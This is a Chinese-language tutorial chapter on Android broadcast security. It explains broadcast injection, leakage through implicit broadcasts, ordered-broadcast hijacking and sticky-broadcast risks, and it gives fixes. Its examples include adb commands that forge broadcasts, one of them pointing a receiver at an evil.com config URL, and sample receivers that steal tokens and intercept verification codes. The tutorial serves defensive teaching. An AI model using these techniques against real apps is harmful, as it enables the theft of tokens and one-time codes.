# Android移动安全第八章_广播安全
> QIANXIN Team
> 来源：https://forum.butian.net/share/4875

> 系列目录：
> 
> 1.  Android 组件导出安全
> 2.  Android Intent 安全
> 3.  Android Binder 服务安全
> 4.  Android ContentProvider 安全
> 5.  Android WebView 安全
> 6.  Android UI 欺骗与钓鱼
> 7.  Android Deep Link 安全
> 8.  Android 广播安全（本章）
> 9.  Android PendingIntent 安全
> 10.  Android 系统设置安全
> 11.  Android SSRF 与网络安全
> 12.  Android 加密与数据存储安全
> 13.  Android 认证与证书校验
> 14.  Android Zip Slip 路径遍历
> 15.  Android Fragment Injection
> 16.  Android SELinux 与沙箱机制

* * *

## 1\. 前言

Android 的广播（Broadcast）是一种一对多的消息机制。一个组件发出一条广播，所有注册了匹配条件的 BroadcastReceiver（广播接收器）都会收到。系统用它来通知各种事件——开机完成、网络变化、电量低、App 安装/卸载等。App 之间也可以用自定义广播来通信。

广播的安全问题可以从两个方向看：

-   发送方向：App 发出的广播被谁收到了？如果广播中携带了敏感数据（token、验证码），被攻击者的 Receiver 截获就是信息泄露
-   接收方向：Receiver 收到的广播来自谁？如果 Receiver 不校验广播来源，攻击者可以伪造广播触发敏感逻辑

第一章用 ADB 演示过向导出的 Receiver 发送伪造广播，那是接收方向的问题。本章把两个方向都展开讲。

* * *

## 2\. 广播基础

### 2.1 注册方式

BroadcastReceiver 有两种注册方式：

静态注册——在 Manifest 中声明，App 安装后就生效，即使 App 没有运行也能收到广播（Android 8.0 之后有限制，后面会讲）：

```xml
<receiver
    android:name=".BootReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
    </intent-filter>
</receiver>
```

动态注册——在代码中注册，只在 App 运行期间有效：

```java
IntentFilter filter = new IntentFilter("com.example.ACTION_UPDATE");
registerReceiver(myReceiver, filter);
```

从安全角度看，静态注册的 Receiver 更容易被发现（直接在 Manifest 中可见），动态注册的 Receiver 需要通过代码分析才能找到。

### 2.2 广播类型

Android 有三种广播分发方式：

| 类型 | 方法 | 特点 |
| --- | --- | --- |
| 普通广播 | sendBroadcast() | 所有匹配的 Receiver 同时收到，无序 |
| 有序广播 | sendOrderedBroadcast() | 按优先级依次分发，高优先级先收到，可以修改或终止广播 |
| Sticky 广播 | sendStickyBroadcast() | 广播发出后会"粘"在系统中，后续注册的 Receiver 也能收到（已废弃） |

普通广播是最常用的，有序广播用于需要按顺序处理的场景（比如短信接收），Sticky 广播在 Android 5.0 后被标记为废弃但仍然可用。

### 2.3 权限控制

发送和接收广播都可以附加权限要求：

```java

sendBroadcast(intent, "com.example.permission.RECEIVE_DATA");


registerReceiver(receiver, filter, "com.example.permission.SEND_DATA", null);
```

Manifest 中静态注册也可以指定权限：

```xml
<receiver
    android:name=".SecureReceiver"
    android:exported="true"
    android:permission="com.example.permission.TRUSTED_SENDER">
    <intent-filter>
        <action android:name="com.example.ACTION_SECURE" />
    </intent-filter>
</receiver>
```

这样只有持有 `com.example.permission.TRUSTED_SENDER` 权限的 App 发出的广播才会被 SecureReceiver 接收。但和第一章讲的一样，如果这个权限的 protectionLevel 是 normal，任何 App 声明 `<uses-permission>` 就能获得，保护力度有限。

* * *

## 3\. 广播注入

### 3.1 原理

如果一个导出的 BroadcastReceiver 没有设置权限保护，任何 App 都可以向它发送广播。Receiver 内部如果不校验广播来源就直接处理数据，攻击者就能注入恶意数据触发敏感逻辑。

```java
public class CommandReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String command = intent.getStringExtra("command");
        if ("clear_cache".equals(command)) {
            clearAppCache(context);
        } else if ("reset_token".equals(command)) {
            resetAuthToken(context);  
        } else if ("update_config".equals(command)) {
            String configUrl = intent.getStringExtra("config_url");
            downloadConfig(configUrl);  
        }
    }
}
```

攻击者通过 ADB 或恶意 App 发送伪造广播：

```bash
adb shell am broadcast -a com.example.ACTION_COMMAND \
    --es command "reset_token"
```

或者：

```bash
adb shell am broadcast -a com.example.ACTION_COMMAND \
    --es command "update_config" \
    --es config_url "https://evil.com/malicious_config.json"
```

### 3.2 常见的危险模式

| 模式 | 说明 | 危害 |
| --- | --- | --- |
| 命令执行 | Receiver 根据广播参数执行不同操作 | 触发敏感功能 |
| URL 加载 | Receiver 从广播中取 URL 传给 WebView 或下载器 | 加载恶意内容 |
| 数据写入 | Receiver 把广播中的数据写入数据库或文件 | 数据污染 |
| 状态修改 | Receiver 根据广播修改 App 内部状态（登录状态、配置项） | 逻辑绕过 |

### 3.3 系统广播伪造

有些 App 会监听系统广播（如 `BOOT_COMPLETED`、`CONNECTIVITY_CHANGE`）来触发特定逻辑。攻击者可以伪造这些系统广播：

```bash
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED \
    -n com.target.app/.BootReceiver
```

但从 Android 8.0 开始，很多系统广播被限制为只能由系统发送（protected broadcast）。第三方 App 发送 protected broadcast 会被系统拒绝。不过这个限制只针对 `sendBroadcast()`，通过 ADB 的 `am broadcast` 仍然可以发送。

* * *

## 4\. 广播泄露

### 4.1 隐式广播泄露

第二章讲过隐式 Intent 的泄露问题，广播也一样。如果 App 使用隐式广播（不指定接收者包名）发送敏感数据，任何注册了匹配 action 的 App 都能收到：

```java

Intent intent = new Intent("com.example.ACTION_TOKEN_UPDATE");
intent.putExtra("new_token", "eyJhbGciOiJIUzI1NiJ9...");
sendBroadcast(intent);
```

攻击者只需注册一个匹配的 Receiver：

```xml
<receiver android:name=".TokenStealer" android:exported="true">
    <intent-filter>
        <action android:name="com.example.ACTION_TOKEN_UPDATE" />
    </intent-filter>
</receiver>
```

安全的做法是使用显式广播（指定接收者包名）或 LocalBroadcastManager（后面会讲）：

```java

Intent intent = new Intent("com.example.ACTION_TOKEN_UPDATE");
intent.setPackage("com.example.app");
intent.putExtra("new_token", "eyJhbGciOiJIUzI1NiJ9...");
sendBroadcast(intent);
```

### 4.2 有序广播劫持

有序广播（Ordered Broadcast）按 Receiver 的优先级（priority）从高到低依次分发。高优先级的 Receiver 可以：

-   读取广播中的数据
-   修改广播数据（通过 `setResultData()` / `setResultExtras()`）
-   终止广播传递（通过 `abortBroadcast()`），后续低优先级的 Receiver 收不到

```java

Intent intent = new Intent("com.example.ACTION_VERIFY");
intent.putExtra("verification_code", "123456");
sendOrderedBroadcast(intent, null);
```

攻击者注册一个高优先级的 Receiver：

```xml
<receiver android:name=".Hijacker" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="com.example.ACTION_VERIFY" />
    </intent-filter>
</receiver>
```

```java
public class Hijacker extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        
        String code = intent.getStringExtra("verification_code");
        Log.d("Hijacker", "Intercepted code: " + code);

        
        abortBroadcast();
    }
}
```

priority 的有效范围是 -1000 到 1000。攻击者设置 999 就能抢在大多数合法 Receiver 之前处理广播。

这个攻击在早期 Android 版本上被用于拦截短信验证码——系统通过有序广播分发收到的短信，恶意 App 注册高优先级 Receiver 就能先于短信 App 收到短信内容，然后 abortBroadcast 让用户看不到这条短信。Android 4.4 之后，短信广播的分发机制做了调整，默认短信 App 总是能收到，但其他 App 仍然可以监听。

### 4.3 resultData 泄露

有序广播的 Receiver 可以通过 `setResultData()` 设置返回数据，后续 Receiver 通过 `getResultData()` 读取。如果某个 Receiver 把敏感数据放到 resultData 中，后续所有 Receiver 都能读到：

```java

@Override
public void onReceive(Context context, Intent intent) {
    String token = generateToken();
    setResultData(token);  
}


@Override
public void onReceive(Context context, Intent intent) {
    String token = getResultData();  
    Log.d("Attacker", "Got token: " + token);
}
```

* * *

## 5\. Sticky 广播

### 5.1 原理

Sticky 广播（粘性广播）通过 `sendStickyBroadcast()` 发送。和普通广播不同的是，Sticky 广播发出后会"粘"在系统中——即使发送时没有匹配的 Receiver，后续注册的 Receiver 也能收到最后一次发送的 Sticky 广播。

```java

Intent intent = new Intent("com.example.ACTION_STATUS");
intent.putExtra("status", "authenticated");
intent.putExtra("session_id", "sess_abc123");
sendStickyBroadcast(intent);
```

```java

IntentFilter filter = new IntentFilter("com.example.ACTION_STATUS");
Intent stickyIntent = registerReceiver(null, filter);

String sessionId = stickyIntent.getStringExtra("session_id");
```

### 5.2 安全问题

Sticky 广播有两个安全问题：

1.  数据残留：Sticky 广播的数据一直保留在系统中，直到被 `removeStickyBroadcast()` 显式移除或设备重启。任何 App 在任何时候都可以通过 `registerReceiver(null, filter)` 读取残留的数据
2.  数据覆盖：任何持有 `BROADCAST_STICKY` 权限的 App 都可以发送同一 action 的 Sticky 广播，覆盖之前的数据。`BROADCAST_STICKY` 是 normal 级别权限，声明即可获得

```java

Intent intent = new Intent("com.example.ACTION_STATUS");
intent.putExtra("status", "authenticated");
intent.putExtra("session_id", "attacker_session");
sendStickyBroadcast(intent);
```

如果受害 App 依赖 Sticky 广播中的 session\_id 来做身份验证，攻击者就能注入自己的 session。

### 5.3 废弃状态

`sendStickyBroadcast()` 在 Android 5.0（API 21）被标记为 `@Deprecated`（废弃），但没有被移除，仍然可以调用。Google 建议使用其他机制（如 SharedPreferences、LiveData、ContentProvider）替代。

实际中仍然有 App 在使用 Sticky 广播，尤其是一些老旧的系统组件和第三方 SDK。

* * *

## 6\. LocalBroadcastManager

### 6.1 原理

LocalBroadcastManager 是 AndroidX 库提供的一个工具类，用于在 App 内部发送和接收广播。它和系统广播的区别是：广播只在 App 进程内传递，不经过系统的广播分发机制，其他 App 无法收到也无法发送。

```java

LocalBroadcastManager lbm = LocalBroadcastManager.getInstance(context);
Intent intent = new Intent("com.example.ACTION_INTERNAL");
intent.putExtra("token", "sensitive_data");
lbm.sendBroadcast(intent);


lbm.registerReceiver(receiver, new IntentFilter("com.example.ACTION_INTERNAL"));
```

### 6.2 安全特性

LocalBroadcastManager 从设计上消除了广播的两个安全问题：

-   不会泄露：广播不离开 App 进程，外部 App 无法监听
-   不会被注入：外部 App 无法向 LocalBroadcastManager 发送广播

但 LocalBroadcastManager 在 AndroidX 1.1.0 中被标记为废弃，Google 建议使用 LiveData 或 Kotlin Flow 等响应式方案替代。废弃的原因不是安全问题，而是架构设计上 Google 更推荐观察者模式。

* * *

## 7\. 版本演进

### 7.1 Android 7.0（API 24）：限制 CONNECTIVITY\_CHANGE

Android 7.0 开始，静态注册的 Receiver 不再能接收 `CONNECTIVITY_ACTION`（网络状态变化）广播。这是 Google 限制隐式广播的第一步——很多 App 注册了这个广播来监听网络变化，导致每次网络切换时大量 App 被唤醒，影响性能和电量。

### 7.2 Android 8.0（API 26）：隐式广播限制

Android 8.0 做了一个比较大的改动：targetSdk >= 26 的 App，静态注册的 Receiver 不再能接收大多数隐式广播。只有少数豁免的广播（如 `BOOT_COMPLETED`、`LOCALE_CHANGED`）仍然可以通过静态注册接收。

这意味着攻击者的 App 如果 targetSdk >= 26，不能通过静态注册 Receiver 来监听目标 App 的自定义隐式广播。但动态注册不受此限制——只要攻击者的 App 在运行，动态注册的 Receiver 仍然可以接收隐式广播。

```java

IntentFilter filter = new IntentFilter("com.target.app.ACTION_TOKEN");
registerReceiver(receiver, filter);
```

### 7.3 Android 9.0（API 28）：NETWORK\_STATE\_CHANGED 限制

Android 9.0 限制了 Wi-Fi 相关广播中携带的信息。`NETWORK_STATE_CHANGED_ACTION` 广播不再包含 SSID（Wi-Fi 网络名称）和 BSSID（接入点 MAC 地址），需要通过 `WifiManager` API 并持有位置权限才能获取。

### 7.4 Android 13（API 33）：动态注册 Receiver 需要声明导出

Android 13 引入了一个新的要求：动态注册 BroadcastReceiver 时必须指定是否接收外部 App 的广播：

```java

registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED);

registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED);
```

如果不指定，targetSdk >= 33 的 App 会抛出异常。这个改动和 Android 12 对静态组件要求显式声明 exported 类似，目的是让开发者明确意识到 Receiver 是否对外暴露。

### 7.5 Android 14（API 34）：Protected Broadcast 加强

Android 14 扩大了 protected broadcast 的范围，更多系统广播被标记为只能由系统发送。第三方 App 尝试发送 protected broadcast 时会被系统静默丢弃（不抛异常，但广播不会被分发）。

* * *

## 8\. 总结

广播的安全问题围绕"谁发的"和"谁收到了"两个方向展开。

回顾一下：

-   广播注入：导出的 Receiver 没有权限保护时，攻击者可以发送伪造广播触发敏感逻辑
-   隐式广播泄露：不指定接收者包名的广播可以被任何 App 监听，携带敏感数据时就是信息泄露
-   有序广播劫持：高优先级的 Receiver 可以读取、修改、终止广播，早期被用于拦截短信验证码
-   Sticky 广播的数据残留在系统中，任何 App 随时可以读取，且可以被覆盖
-   Android 8.0 限制了静态注册接收隐式广播，Android 13 要求动态注册时声明是否导出

下一章讲 Android PendingIntent 安全。PendingIntent 是一种延迟执行的 Intent 包装，它允许其他 App 或系统在未来某个时刻代替你执行操作——这个"代替"机制如果处理不当，就是权限提升的入口。
